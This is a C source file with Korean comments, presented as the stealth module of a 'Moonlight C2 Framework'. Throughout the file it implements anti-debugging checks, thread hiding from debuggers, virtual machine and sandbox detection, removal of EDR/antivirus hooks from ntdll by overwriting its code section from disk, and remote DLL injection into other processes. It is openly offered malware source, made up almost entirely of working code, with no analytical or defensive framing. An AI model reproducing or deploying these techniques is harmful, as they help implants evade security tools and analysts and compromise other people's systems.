/*
 * Moonlight C2 Framework - 스텔스 모듈 (C 구현)
 * 고급 안티 디버깅, 안티 VM, 프로세스 숨김 기법
 * 원본 어셈블리를 C로 변환
 */

#include <windows.h>
#include <winternl.h>
#include <stdio.h>
#include <intrin.h>

// NTDLL 함수 타입 정의
typedef NTSTATUS (NTAPI *pNtQueryInformationProcess)(
    HANDLE ProcessHandle,
    PROCESSINFOCLASS ProcessInformationClass,
    PVOID ProcessInformation,
    ULONG ProcessInformationLength,
    PULONG ReturnLength
);

typedef NTSTATUS (NTAPI *pNtSetInformationThread)(
    HANDLE ThreadHandle,
    THREADINFOCLASS ThreadInformationClass,
    PVOID ThreadInformation,
    ULONG ThreadInformationLength
);

// ==============================================================================
// 안티 디버깅: 디버거가 있는지 확인
// 반환: 1 = 디버거 탐지, 0 = 정상
// ==============================================================================
int check_debugger() {
    // 방법 1: PEB->BeingDebugged 체크
    BOOL isDebuggerPresent = FALSE;
    
#ifdef _WIN64
    PPEB peb = (PPEB)__readgsqword(0x60);
#else
    PPEB peb = (PPEB)__readfsdword(0x30);
#endif
    
    if (peb->BeingDebugged) {
        return 1;
    }
    
    // 방법 2: CheckRemoteDebuggerPresent
    if (CheckRemoteDebuggerPresent(GetCurrentProcess(), &isDebuggerPresent)) {
        if (isDebuggerPresent) {
            return 1;
        }
    }
    
    // 방법 3: NtQueryInformationProcess (ProcessDebugPort)
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (hNtdll) {
        pNtQueryInformationProcess NtQueryInfoProcess = 
            (pNtQueryInformationProcess)GetProcAddress(hNtdll, "NtQueryInformationProcess");
        
        if (NtQueryInfoProcess) {
            DWORD_PTR debugPort = 0;
            NTSTATUS status = NtQueryInfoProcess(
                GetCurrentProcess(),
                (PROCESSINFOCLASS)7, // ProcessDebugPort
                &debugPort,
                sizeof(debugPort),
                NULL
            );
            
            if (NT_SUCCESS(status) && debugPort != 0) {
                return 1;
            }
        }
    }
    
    // 방법 4: 하드웨어 중단점 체크 (컨텍스트 사용)
    CONTEXT ctx;
    ZeroMemory(&ctx, sizeof(CONTEXT));
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    
    if (GetThreadContext(GetCurrentThread(), &ctx)) {
        if (ctx.Dr0 != 0 || ctx.Dr1 != 0 || ctx.Dr2 != 0 || ctx.Dr3 != 0) {
            return 1;
        }
    }
    
    // 방법 5: 타이밍 체크 (RDTSC)
    unsigned __int64 start = __rdtsc();
    unsigned __int64 end = __rdtsc();
    
    if ((end - start) > 0x1000) { // 4096 사이클 이상 차이
        return 1;
    }
    
    return 0;
}

// ==============================================================================
// 디버거로부터 프로세스 숨김
// ==============================================================================
void hide_from_debugger() {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (hNtdll) {
        pNtSetInformationThread NtSetInfoThread = 
            (pNtSetInformationThread)GetProcAddress(hNtdll, "NtSetInformationThread");
        
        if (NtSetInfoThread) {
            // ThreadHideFromDebugger = 0x11
            NtSetInfoThread(GetCurrentThread(), (THREADINFOCLASS)0x11, NULL, 0);
        }
    }
}

// ==============================================================================
// VM 탐지: 가상 머신에서 실행 중인지 확인
// 반환: 1 = VM 탐지, 0 = 물리적 시스템
// ==============================================================================
int check_vm() {
    int cpuInfo[4] = {0};
    
    // CPUID를 통한 하이퍼바이저 탐지
    __cpuid(cpuInfo, 1);
    
    // ECX 레지스터의 31번 비트가 하이퍼바이저 플래그
    if (cpuInfo[2] & (1 << 31)) {
        return 1;
    }
    
    // VMware 특정 포트 체크 (0x5658 "VX")
    __try {
        unsigned int result = 0;
        __asm {
            push edx
            push ecx
            push ebx
            
            mov eax, 'VMXh'
            mov ebx, 0
            mov ecx, 10
            mov edx, 'VX'
            
            in eax, dx
            
            mov result, ebx
            
            pop ebx
            pop ecx
            pop edx
        }
        
        if (result == 'VMXh') {
            return 1;
        }
    }
    __except(EXCEPTION_EXECUTE_HANDLER) {
        // 예외 발생 시 물리적 시스템
    }
    
    // VirtualBox CPUID 체크
    __cpuid(cpuInfo, 0x40000000);
    char vendor[13] = {0};
    memcpy(vendor, &cpuInfo[1], 4);
    memcpy(vendor + 4, &cpuInfo[2], 4);
    memcpy(vendor + 8, &cpuInfo[3], 4);
    
    if (strstr(vendor, "VBoxVBoxVBox")) {
        return 1;
    }
    
    // Hyper-V 체크
    if (strstr(vendor, "Microsoft Hv")) {
        return 1;
    }
    
    return 0;
}

// ==============================================================================
// 샌드박스 탐지: 분석 환경 탐지
// 반환: 1 = 샌드박스 탐지, 0 = 정상 환경
// ==============================================================================
int check_sandbox() {
    // 가동 시간 체크 (10분 미만이면 샌드박스 가능성)
    DWORD uptime = GetTickCount();
    if (uptime < 600000) { // 10분 = 600,000ms
        return 1;
    }
    
    // CPU 코어 수 체크
    SYSTEM_INFO sysInfo;
    GetSystemInfo(&sysInfo);
    if (sysInfo.dwNumberOfProcessors < 2) {
        return 1;
    }
    
    // RAM 크기 체크 (2GB 미만이면 샌드박스 가능성)
    MEMORYSTATUSEX memStatus;
    memStatus.dwLength = sizeof(memStatus);
    if (GlobalMemoryStatusEx(&memStatus)) {
        DWORDLONG totalRAM = memStatus.ullTotalPhys / (1024 * 1024); // MB
        if (totalRAM < 2048) { // 2GB
            return 1;
        }
    }
    
    // 슬립 가속 탐지
    DWORD before = GetTickCount();
    Sleep(1000); // 1초 대기
    DWORD after = GetTickCount();
    
    if ((after - before) < 900) { // 실제로 900ms 미만이면 슬립 건너뛰기
        return 1;
    }
    
    // 일반적인 분석 도구 파일 체크
    const char* analysisTools[] = {
        "C:\\analysis\\malware.exe",
        "C:\\sample\\sample.exe",
        "C:\\sandbox\\starter.exe"
    };
    
    for (int i = 0; i < sizeof(analysisTools) / sizeof(char*); i++) {
        if (GetFileAttributesA(analysisTools[i]) != INVALID_FILE_ATTRIBUTES) {
            return 1;
        }
    }
    
    return 0;
}

// ==============================================================================
// NTDLL 언후킹: EDR/AV 후킹 제거
// ==============================================================================
int unhook_ntdll() {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) {
        return 0;
    }
    
    // 디스크에서 깨끗한 ntdll.dll 로드
    HANDLE hFile = CreateFileA("C:\\Windows\\System32\\ntdll.dll", 
                               GENERIC_READ, FILE_SHARE_READ, 
                               NULL, OPEN_EXISTING, 0, NULL);
    
    if (hFile == INVALID_HANDLE_VALUE) {
        return 0;
    }
    
    DWORD fileSize = GetFileSize(hFile, NULL);
    LPVOID fileBuffer = VirtualAlloc(NULL, fileSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    
    if (!fileBuffer) {
        CloseHandle(hFile);
        return 0;
    }
    
    DWORD bytesRead;
    if (!ReadFile(hFile, fileBuffer, fileSize, &bytesRead, NULL)) {
        VirtualFree(fileBuffer, 0, MEM_RELEASE);
        CloseHandle(hFile);
        return 0;
    }
    
    CloseHandle(hFile);
    
    // PE 헤더 파싱
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)fileBuffer;
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((BYTE*)fileBuffer + dosHeader->e_lfanew);
    
    // .text 섹션 찾기 (주요 코드 섹션)
    PIMAGE_SECTION_HEADER sectionHeader = IMAGE_FIRST_SECTION(ntHeaders);
    
    for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
        if (strcmp((char*)sectionHeader[i].Name, ".text") == 0) {
            // 메모리 보호 변경
            DWORD oldProtect;
            LPVOID ntdllBase = (LPVOID)hNtdll;
            LPVOID textSection = (LPVOID)((BYTE*)ntdllBase + sectionHeader[i].VirtualAddress);
            
            if (VirtualProtect(textSection, sectionHeader[i].Misc.VirtualSize, 
                              PAGE_EXECUTE_READWRITE, &oldProtect)) {
                
                // 깨끗한 바이트로 덮어쓰기
                memcpy(textSection, 
                       (LPVOID)((BYTE*)fileBuffer + sectionHeader[i].VirtualAddress),
                       sectionHeader[i].Misc.VirtualSize);
                
                // 원래 보호 복원
                VirtualProtect(textSection, sectionHeader[i].Misc.VirtualSize, 
                              oldProtect, &oldProtect);
            }
            
            break;
        }
    }
    
    VirtualFree(fileBuffer, 0, MEM_RELEASE);
    return 1;
}

// ==============================================================================
// 프로세스에 DLL 인젝션
// ==============================================================================
int inject_dll(DWORD processId, const char* dllPath) {
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
    if (!hProcess) {
        return 0;
    }
    
    SIZE_T pathLen = strlen(dllPath) + 1;
    LPVOID remotePath = VirtualAllocEx(hProcess, NULL, pathLen, 
                                       MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    
    if (!remotePath) {
        CloseHandle(hProcess);
        return 0;
    }
    
    if (!WriteProcessMemory(hProcess, remotePath, dllPath, pathLen, NULL)) {
        VirtualFreeEx(hProcess, remotePath, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 0;
    }
    
    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    LPVOID loadLibraryAddr = (LPVOID)GetProcAddress(hKernel32, "LoadLibraryA");
    
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, 
                                       (LPTHREAD_START_ROUTINE)loadLibraryAddr,
                                       remotePath, 0, NULL);
    
    if (!hThread) {
        VirtualFreeEx(hProcess, remotePath, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 0;
    }
    
    WaitForSingleObject(hThread, INFINITE);
    
    CloseHandle(hThread);
    VirtualFreeEx(hProcess, remotePath, 0, MEM_RELEASE);
    CloseHandle(hProcess);
    
    return 1;
}

// ==============================================================================
// Kernel32.dll 베이스 주소 가져오기
// ==============================================================================
HMODULE get_kernel32_base() {
    return GetModuleHandleA("kernel32.dll");
}

// ==============================================================================
// NTDLL.dll 베이스 주소 가져오기
// ==============================================================================
HMODULE get_ntdll_base() {
    return GetModuleHandleA("ntdll.dll");
}
